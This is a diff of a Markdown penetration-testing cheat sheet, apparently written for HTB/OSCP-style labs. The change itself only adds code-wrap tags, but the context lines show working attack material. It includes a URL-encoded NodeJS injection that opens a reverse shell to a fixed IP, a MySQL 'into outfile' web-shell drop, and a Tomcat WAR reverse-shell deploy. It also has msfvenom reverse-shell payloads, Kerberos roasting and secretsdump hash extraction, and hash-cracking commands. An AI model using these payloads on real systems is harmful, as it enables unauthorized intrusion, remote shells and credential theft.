@@ -44,6 +44,7 @@ wget --no-passive-ftp ftp://[USERNAME]:[PASSWORD]@[IP_ADDR]/[FILE]
 
 #### SSH (22)
 
+{% code overflow="wrap" %}
 ```shell
 ssh [USERNAME]@[IP_ADDR] [PORT]
 ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -o Ciphers=aes256-cbc [IP_ADDR]
@@ -57,6 +58,7 @@ john hash --wordlist=/opt/wordlists/rockyou.txt
 ssh-keygen
 # upload id_rsa.pub content to authorized_keys in remote machine for ssh access
 ```
+{% endcode %}
 
 #### SMTP (25)
 
@@ -94,6 +96,7 @@ gobuster dns -d analysis.htb -w /usr/share/dirb/big.txt -r 10.10.11.250:53
 
 #### HTTP (80) / HTTPS (443)
 
+{% code overflow="wrap" %}
 ```shell
 gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
 ffuf -u http://[IP_ADDR]/ -H "Host: FUZZ.[DOMAIN]" -w /seclists/Discovery/DNS/shubs-subdomains.txt -t 100 -fl 10
@@ -114,14 +117,17 @@ git-dumper -r 2 -j 1 http://example.com/ .
 ----NodeJS function injection----
 (function(){var+net+%3d+require("net"),cp%3drequire("child_process"),sh%3dcp.spawn("/bin/sh",+[])%3bvar+client+%3d+new+net.Socket()%3b+client.connect(21,+"192.168.49.77",+function(){client.pipe(sh.stdin)%3bsh.stdout.pipe(client)%3bsh.stderr.pipe(client)%3b})%3breturn+/a/%3b})()%3b
 ```
+{% endcode %}
 
 #### Kerberos (88)
 
+{% code overflow="wrap" %}
 ```shell
 kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
 GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
 secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
 ```
+{% endcode %}
 
 Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
 
@@ -175,6 +181,7 @@ GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -no-pass -userfiles userna
 
 #### SMB (445)
 
+{% code overflow="wrap" %}
 ```shell
 smbclient -L [IP_ADDR]    # To list out available directories
 smbclient \\\\[IP_ADDR]\\[DIRECTORY]    # To show directory content
@@ -189,6 +196,7 @@ crackmapexec smb [IP_ADDR] -d [domain] -u [USERNAME] -p [PASSWORD] --shares   # 
 enum4linux -a [IP_ADDR]
 gpp-decrypt "[cpassword]"   # with sysvol groups.xml readable
 ```
+{% endcode %}
 
 MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016 SMB share folder mounting
 
@@ -219,6 +227,7 @@ select * from user_role_privs;
 
 #### Microsoft SQL (1433)
 
+{% code overflow="wrap" %}
 ```shell
 impacket-mssqlclient [DOMAIN]/[USERNAME]@[IP_ADDR] -windows-auth    # Connect to mssql server
 SELECT IS_SRVROLEMEMBER('sysadmin')   # Check for sysadmin privileage; return 1 for true, 0 for false
@@ -230,9 +239,11 @@ USE [db];
 SELECT name FROM sys.tables;
 SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
 ```
+{% endcode %}
 
 #### MySQL (3306)
 
+{% code overflow="wrap" %}
 ```shell
 mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
 mysql -u [USERNAME] -h [IP_ADDR] -p -e 'SHOW DATABASES;'
@@ -242,14 +253,17 @@ select "<?php echo shell_exec($_GET['cmd']);?>" into outfile 'C:/xampp/htdocs/sh
 Requirement (root mysql credential, MySQL 4.1.10a and MySQL 4.0.24)
 https://www.exploit-db.com/exploits/1518
 ```
+{% endcode %}
 
 #### RDP (3389)
 
+{% code overflow="wrap" %}
 ```shell
 rdesktop -u -r clipboard:CLIPBOARD [USERNAME] [IP_ADDR]:[PORT]
 xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
 . \\tsclient\share\   # in powershell to access the files in /tmp
 ```
+{% endcode %}
 
 #### Postgresql (5432)
 
@@ -311,6 +325,7 @@ system.rev [ATTACKER_IP] [PORT]
 
 #### Apache Tomcat (8080)
 
+{% code overflow="wrap" %}
 ```shell
 Default page:
 /admin
@@ -319,6 +334,7 @@ Default page:
 Exploit script manager:
 curl -u 'tomcat:[PASSWORD]' http://[IP_ADDR]:8080/manager/text/deploy?path=/[PATH] -T rev.war
 ```
+{% endcode %}
 
 #### SPLUNK (8089)
 
@@ -339,6 +355,7 @@ db.[COLLECTIONS].find()
 
 ## Working with MSFVENOM and MSFCONSOLE
 
+{% code overflow="wrap" %}
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
@@ -358,6 +375,7 @@ sysinfo    # get information of the remote system
 background / ctrl+z
 use post/multi/recon/local_exploit_suggester    # set session number
 ```
+{% endcode %}
 
 ### Cisco router password cracker
 
@@ -382,9 +400,11 @@ john [hash_file] --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
 
 ### Hashcat
 
-```
+{% code overflow="wrap" %}
+```bash
 hashcat -a 3 -m 0 [HASH_FILE] /usr/share/wordlists/rockyou.txt    # -a 3 bruteforce attack; -m 0 MD5 mode
 ```
+{% endcode %}
 
 Ref: https://hashcat.net/wiki/doku.php?id=example\_hashes
 
